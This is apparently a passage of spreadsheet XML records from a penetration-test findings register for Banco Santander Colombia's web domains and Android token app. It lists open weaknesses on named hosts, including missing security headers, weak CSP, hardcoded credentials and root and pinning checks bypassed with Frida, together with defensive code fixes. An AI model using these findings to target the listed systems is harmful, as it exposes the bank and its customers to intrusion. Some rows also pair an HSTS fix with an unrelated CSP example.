    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a_x000a_securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página_x000a_externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos._x000a_Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera_x000a_HTTP Content-Security-Policy._x000a_Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos_x000a_sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran_x000a_parte de las capacidades de seguridad de la cabecera._x000a_Un ejemplo de configuración de cabecera es el siguiente:_x000a_· Content-Security-Policy: default-src 'self' *.trusted.com_x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo:_x000a_· &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src_x000a_'none';&quot;&gt;"/>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
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="426"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO039"/>
    <x v="187"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="https://www.cdt.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador."/>
    <s v="Se recomienda definir la cabecera Permissions-Policy para restringir explícitamente el acceso a_x000a_funcionalidades del navegador, deshabilitando aquellas que no sean necesarias en el contexto de_x000a_la aplicación. Esto refuerza el principio de mínimo privilegio y reduce el riesgo de abuso por parte_x000a_de contenido embebido o de terceros."/>
    <s v="Sin esta cabecera, el navegador no tiene restricciones explícitas sobre el uso de APIs y funcionalidades sensibles (como cámara, micrófono, geolocalización, sensores, etc.). Esto puede permitir que recursos embebidos, como iframes de terceros, accedan a funcionalidades del navegador que podrían ser utilizadas con fines maliciosos, incrementando la superficie de ataque y afectando la privacidad del usuario."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="427"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO040"/>
    <x v="187"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="Assets.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador."/>
    <s v="Se recomienda definir la cabecera Permissions-Policy para restringir explícitamente el acceso a_x000a_funcionalidades del navegador, deshabilitando aquellas que no sean necesarias en el contexto de_x000a_la aplicación. Esto refuerza el principio de mínimo privilegio y reduce el riesgo de abuso por parte_x000a_de contenido embebido o de terceros."/>
    <s v="Sin esta cabecera, el navegador no tiene restricciones explícitas sobre el uso de APIs y funcionalidades sensibles (como cámara, micrófono, geolocalización, sensores, etc.). Esto puede permitir que recursos embebidos, como iframes de terceros, accedan a funcionalidades del navegador que podrían ser utilizadas con fines maliciosos, incrementando la superficie de ataque y afectando la privacidad del usuario."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="428"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO041"/>
    <x v="187"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="Even.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador."/>
    <s v="Se recomienda definir la cabecera Permissions-Policy para restringir explícitamente el acceso a_x000a_funcionalidades del navegador, deshabilitando aquellas que no sean necesarias en el contexto de_x000a_la aplicación. Esto refuerza el principio de mínimo privilegio y reduce el riesgo de abuso por parte_x000a_de contenido embebido o de terceros."/>
    <s v="Sin esta cabecera, el navegador no tiene restricciones explícitas sobre el uso de APIs y funcionalidades sensibles (como cámara, micrófono, geolocalización, sensores, etc.). Esto puede permitir que recursos embebidos, como iframes de terceros, accedan a funcionalidades del navegador que podrían ser utilizadas con fines maliciosos, incrementando la superficie de ataque y afectando la privacidad del usuario."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="429"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO042"/>
    <x v="187"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="Bo.prod.cc.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador."/>
    <s v="Se recomienda definir la cabecera Permissions-Policy para restringir explícitamente el acceso a_x000a_funcionalidades del navegador, deshabilitando aquellas que no sean necesarias en el contexto de_x000a_la aplicación. Esto refuerza el principio de mínimo privilegio y reduce el riesgo de abuso por parte_x000a_de contenido embebido o de terceros."/>
    <s v="Sin esta cabecera, el navegador no tiene restricciones explícitas sobre el uso de APIs y funcionalidades sensibles (como cámara, micrófono, geolocalización, sensores, etc.). Esto puede permitir que recursos embebidos, como iframes de terceros, accedan a funcionalidades del navegador que podrían ser utilizadas con fines maliciosos, incrementando la superficie de ataque y afectando la privacidad del usuario."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="430"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO043"/>
    <x v="187"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="Gdcs.prod.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador."/>
    <s v="Se recomienda definir la cabecera Permissions-Policy para restringir explícitamente el acceso a_x000a_funcionalidades del navegador, deshabilitando aquellas que no sean necesarias en el contexto de_x000a_la aplicación. Esto refuerza el principio de mínimo privilegio y reduce el riesgo de abuso por parte_x000a_de contenido embebido o de terceros."/>
    <s v="Sin esta cabecera, el navegador no tiene restricciones explícitas sobre el uso de APIs y funcionalidades sensibles (como cámara, micrófono, geolocalización, sensores, etc.). Esto puede permitir que recursos embebidos, como iframes de terceros, accedan a funcionalidades del navegador que podrían ser utilizadas con fines maliciosos, incrementando la superficie de ataque y afectando la privacidad del usuario."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="431"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO044"/>
    <x v="187"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="Teal.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador."/>
    <s v="Se recomienda definir la cabecera Permissions-Policy para restringir explícitamente el acceso a_x000a_funcionalidades del navegador, deshabilitando aquellas que no sean necesarias en el contexto de_x000a_la aplicación. Esto refuerza el principio de mínimo privilegio y reduce el riesgo de abuso por parte_x000a_de contenido embebido o de terceros."/>
    <s v="Sin esta cabecera, el navegador no tiene restricciones explícitas sobre el uso de APIs y funcionalidades sensibles (como cámara, micrófono, geolocalización, sensores, etc.). Esto puede permitir que recursos embebidos, como iframes de terceros, accedan a funcionalidades del navegador que podrían ser utilizadas con fines maliciosos, incrementando la superficie de ataque y afectando la privacidad del usuario."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="432"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO045"/>
    <x v="188"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="2.8"/>
    <m/>
    <m/>
    <s v="Even.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales_x000a_servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante_x000a_pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante_x000a_la sesión._x000a_El estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, empleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la información se envía a través de un canal seguro._x000a__x000a_El protocolo incorpora una cabecera HTTP &quot;HSTS&quot; (HTTP Strict Transport Security) enviada desde el_x000a_servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación_x000a_entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una_x000a_cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y_x000a_subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán_x000a_almacenadas en el navegador durante un tiempo determinado que se establece en la propia_x000a_cabecera de respuesta"/>
    <s v="Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta &quot;HSTS&quot;_x000a_en todas las respuestas del servidor. La sintaxis para ello es:_x000a_• Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains]_x000a_El parámetro &quot;max-age&quot; especifica el tiempo requerido para usar HTTPS y debería ser un número_x000a_alto, del orden de varios meses. La flag &quot;includeSubDomains&quot; define que la política aplica también a_x000a_los subdominios. Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una_x000a_política, por ejemplo:_x000a_· &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src_x000a_'none';&quot;&gt;"/>
    <s v="En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web_x000a_y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="433"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO046"/>
    <x v="188"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="2.8"/>
    <m/>
    <m/>
    <s v="Gdcs.prod.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales_x000a_servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante_x000a_pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante_x000a_la sesión._x000a_El estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, empleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la información se envía a través de un canal seguro._x000a__x000a_El protocolo incorpora una cabecera HTTP &quot;HSTS&quot; (HTTP Strict Transport Security) enviada desde el_x000a_servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación_x000a_entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una_x000a_cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y_x000a_subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán_x000a_almacenadas en el navegador durante un tiempo determinado que se establece en la propia_x000a_cabecera de respuesta"/>
    <s v="Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta &quot;HSTS&quot;_x000a_en todas las respuestas del servidor. La sintaxis para ello es:_x000a_• Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains]_x000a_El parámetro &quot;max-age&quot; especifica el tiempo requerido para usar HTTPS y debería ser un número_x000a_alto, del orden de varios meses. La flag &quot;includeSubDomains&quot; define que la política aplica también a_x000a_los subdominios. Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una_x000a_política, por ejemplo:_x000a_· &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src_x000a_'none';&quot;&gt;"/>
    <s v="En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web_x000a_y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="434"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO047"/>
    <x v="188"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="2.8"/>
    <m/>
    <m/>
    <s v="Teal.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales_x000a_servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante_x000a_pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante_x000a_la sesión._x000a_El estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, empleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la información se envía a través de un canal seguro._x000a__x000a_El protocolo incorpora una cabecera HTTP &quot;HSTS&quot; (HTTP Strict Transport Security) enviada desde el_x000a_servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación_x000a_entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una_x000a_cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y_x000a_subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán_x000a_almacenadas en el navegador durante un tiempo determinado que se establece en la propia_x000a_cabecera de respuesta"/>
    <s v="Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta &quot;HSTS&quot;_x000a_en todas las respuestas del servidor. La sintaxis para ello es:_x000a_• Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains]_x000a_El parámetro &quot;max-age&quot; especifica el tiempo requerido para usar HTTPS y debería ser un número_x000a_alto, del orden de varios meses. La flag &quot;includeSubDomains&quot; define que la política aplica también a_x000a_los subdominios. Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una_x000a_política, por ejemplo:_x000a_· &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src_x000a_'none';&quot;&gt;"/>
    <s v="En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web_x000a_y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="435"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <s v="MAN-686670906c975521ca42a139"/>
    <s v="SC-25-CNAPP-009-AP-001"/>
    <x v="189"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="5.5"/>
    <m/>
    <m/>
    <s v="App Santander Token Colombia Android"/>
    <m/>
    <m/>
    <d v="2025-07-03T00:00:00"/>
    <n v="355"/>
    <d v="2025-10-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Hay que tener en cuenta que las detecciones de root son siempre susceptibles a ser evadidas, ya que se tiene control ilimitado sobre el dispositivo y todas las aplicaciones que se ejecutan. Haciendo uso de la herramienta &quot;Frida&quot; para poder realizar técnicas de instrumentación dinámica del código ha sido posible evadir el control de &quot;Root&quot; implementado ejecutando la aplicación en un dispositivo Rooteado."/>
    <s v="Cuando un dispositivo es rooteado, el sistema es modificado y se instalan algunos archivos nuevos_x000a_en el dispositivo. La comprobación de de la integridad del sistema y estos archivos/paquetes_x000a_instalados en el dispositivo son algunas formas de comprobar si un dispositivo está rooteado o no._x000a_A continuación, se enumeran algunas técnicas más utilizadas para la detección de dispositivos_x000a_rooteados:_x000a__x000a_- Detección de root con SafetyNet Attestation API: Google ofrece la API SafetyNet, que detecta si el_x000a_dispositivo ha sido modificado (rooteado, bootloader desbloqueado, etc.). A continuación, se_x000a_muestra un ejemplo de implementación en kotlin/Java: _x000a_afetyNet.getClient(this).attest(nonce, API_KEY)_x000a_ .addOnSuccessListener { response -&gt;_x000a_ val jwsResult = response.jwsResult_x000a_ // Analizar el resultado y verificar si el dispositivo es seguro_x000a_ }_x000a_ .addOnFailureListener {_x000a_ // Bloquear la app si falla la verificación_x000a_ }_x000a_- Detección manual de root (Archivos del sistema y comandos)_x000a_ - Busqueda de archivos sospechosos como Superuser.apk, eu.chainfire.supersu o el comando su._x000a_A continuación, se muestra un ejemplo de implementación en kotlin/Java:_x000a__x000a_ fun isRooted(): Boolean {_x000a_ val paths = arrayOf(_x000a_ &quot;/system/bin/su&quot;, &quot;/system/xbin/su&quot;, &quot;/system/app/Superuser.apk&quot;_x000a_ )_x000a_ return paths.any { File(it).exists() }_x000a_ }_x000a_ - Hay aplicaciones como Busybox que solo funcionan en dispositivos rooteados. Verificar si está_x000a_instalada es otra manera de comprobar si el dispositivo está rooteado o no._x000a_ - Ejecución de comandos &quot;su&quot; e &quot;id&quot; y verificar si el UID es root._x000a_ - Verificar el atributo &quot;BUILD&quot; para comprobar si el dispositivo está corriendo una ROM_x000a_customizada. Google usa la etiqueta 'release-keys' cuando se trata de ROMs de stock. Si al verificar_x000a_esta etiqueta encontramos algo similar a 'test-keys', estamos ante una ROM customizada. "/>
    <s v="Los dispositivos rooteados, son dispositivos que han sido modificados para permitir que todas las aplicaciones se ejecuten con permisos de superusuario eliminando el sistema de seguridad sandbox que el SO impone. Esto da lugar a que el dispositivo esté expuesto a diferentes amenazas, como podrían ser cualquier tipo de malware o robo de contraseñas a través de keyloggers entre otros."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="436"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <s v="MAN-686670c86c975521ca42a13a"/>
    <s v="SC-25-CNAPP-009-AP-002"/>
    <x v="190"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="5.5"/>
    <m/>
    <m/>
    <s v="App Santander Token Colombia Android"/>
    <m/>
    <m/>
    <d v="2025-07-03T00:00:00"/>
    <n v="355"/>
    <d v="2025-10-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La técnica de Certificate Pinning permite a la aplicación validar la identidad del servidor en las conexiones HTTPS garantizando que la aplicación puede detectar si un atacante está situado en medio de la comunicación y presentando su propio certificado. Para realiza esta validación se suele comprobar la firma del certificado y/o la clave pública, adicionalmente a las comprobaciones de caducidad y validez de la cadena de certificados. En la presente revisión, se ha comprobado que la aplicación implementa un sistema de Certificate Pinning pero que ha sido posible evadir esta protección."/>
    <s v="Para implementar de manera correcta la técnica de SSL Pinning y prevenir los ataques de tipo Manin-the-Middle (MitM) existen dos tipo de implementaciones diferentes:_x000a_•Pinning de Certificado: se almacena el certificado completo dentro de la aplicación y la app solo_x000a_acepta conexiones si el certificado recibido coincide exactamente con el almacenado. A continuación,_x000a_se muestra un ejemplo de implementación en Kotlin._x000a_val client = OkHttpClient.Builder() _x000a_.certificatePinner(_x000a_ CertificatePinner.Builder()_x000a_ .add(&quot;mi-servidor.com&quot;, &quot;sha256/tuCertificadoHash&quot;)_x000a_ .build()_x000a_ )_x000a_ .build()_x000a_•Pinning de Clave Pública: en lugar de almacenar el certificado completo, solo se almacena la clave_x000a_pública del servidor, en este caso, si el servidor cambia su certificado pero mantiene la misma clave_x000a_pública, la app sigue funcionando._x000a_Esta medida de protección puede ser evadida mediante el uso de Frida y su instrumentación_x000a_dinamica, la cual permite interceptar y modificar funciones en tiempo de ejecución._x000a_Adicionalmente, también pueden utilizarse modulos de Magisk para realizar la evasión de este tipo_x000a_de protección._x000a_Teniendo en cuenta estas dos afirmaciones, el SSL Pinning por si solo no es suficiente, deben_x000a_aplicarse protecciones complementarias como la detección de Frida y la detección de modificaciones_x000a_en tiempo de ejecución. _x000a_Para finalizar, se deben implementar mecanismos que dificulten las tareas de debugging, como por_x000a_ejemplo, mediante técnicas de ofuscación con herramientas como ProGuard o R8 para ofuscar_x000a_nombres de clases y métodos, la división de las funciones de detección de root en varias partes del_x000a_código en lugar de centralizarla en un solo métodos y usar técnicas de detección dinámica en_x000a_diferentes momentos de ejecución."/>
    <s v="Un atacante puede evadir la protección de Certificate Pinning con la intención de investigar y_x000a_manipular la información transmitida, entre el dispositivo móvil y el servidor legítimo de aplicaciones,_x000a_con el objetivo de detectar posibles vulnerabilidades en de la plataforma."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="437"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <s v="MAN-686670fd6c975521ca42a13b"/>
    <s v="SC-25-CNAPP-009-AP-003"/>
    <x v="191"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="5.5"/>
    <m/>
    <m/>
    <s v="App Santander Token Colombia Android"/>
    <m/>
    <m/>
    <d v="2025-07-03T00:00:00"/>
    <n v="355"/>
    <d v="2025-10-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Incluir información sensible en los archivos de log puede provocar una exposición de estos a atacantes o aplicaciones maliciosas, vulnerando la confidencialidad del usuario."/>
    <s v="Se recomienda borrar todas las declaraciones de loging del código fuente de las versiones de_x000a_producción de la aplicación, entre estas declaraciones se incluyen las siguientes funciones y clases:_x000a_- android.util.Log_x000a_- Log.d | Log.e | Log.i | Log.v | Log.w | Log.wtf_x000a_- Logger"/>
    <s v="Un atacante con acceso a los ficheros de log del dispositivo tendría acceso a información confidencial, tal como las respuestas del servidor descifradas o el contenido de las peticiones que realiza la aplicación al servidor. "/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="438"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santander Token Colombia"/>
    <m/>
    <s v="SC-25-CNAPP-009-AP-004"/>
    <x v="192"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="2.6"/>
    <m/>
    <m/>
    <s v="App Santander Token Colombia Android"/>
    <m/>
    <m/>
    <d v="2025-07-03T00:00:00"/>
    <n v="355"/>
    <d v="2025-10-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se han localizado credenciales almacenadas en el propio código fuente de la aplicación."/>
    <s v="Se recomienda no utilizar credenciales en texto claro directamente en el propio código fuente de la aplicación móvil ya que podrían estar accesibles a cualquier atacante que realice un proceso de decompilación aplicación. En su lugar se recomienda utilizar un sistema de autenticación basado en tokens y almacenarlos en el almacenamiento de credenciales específico del Sistema Operativo."/>
    <s v="Un usuario puede autenticarse en la plataforma con las credenciales expuestas en el código fuente de la aplicación móvil. El nivel de acceso obtenido corresponderá con los permisos y privilegios específico del usuario al que corresponden las credenciales obtenidas. Debido a que no se ha encontrado el lugar donde utilizarla, el riesgo es bajo."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="439"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="MAN-686bac4370644f0580904c18"/>
    <s v="SC-25-CNMPO-010-CO-001"/>
    <x v="193"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="4.4"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/#_x000a_/administrationGeneral/login"/>
    <m/>
    <m/>
    <d v="2025-07-07T00:00:00"/>
    <n v="351"/>
    <d v="2025-10-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a_servidor o en alguna página de error o por defecto del aplicativo."/>
    <s v="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
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="440"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <m/>
    <s v="SC-25-CNMPO-010-CO-002"/>
    <x v="194"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <d v="2025-07-07T00:00:00"/>
    <n v="351"/>
    <d v="2025-11-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que el servidor web incluye la cabecera Content Security Policy (CSP) con los valores unsafe-inline y unsafe-eval. Esto representa un riesgo de seguridad, ya que permite la ejecución de código JavaScript embebido directamente en la página y el uso de funciones peligrosas como eval(). Estas configuraciones  aumentan la vulnerabilidad a ataques de tipo Cross Site Scripting (XSS), facilitando la ejecución de código malicioso en el navegador del usuario. "/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y_x000a_observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e_x000a_incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una_x000a_lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web._x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-SecurityPolicy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se_x000a_trata de una versión antigua y no es necesario configurarla)._x000a_Un ejemplo de configuración de cabecera es el siguiente:_x000a_• Content-Security-Policy: default-src 'self' *.trusted.com_x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo:_x000a_• &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src_x000a_'none';&quot;&gt;_x000a_"/>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d v="2026-02-27T00:00:00"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="441"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
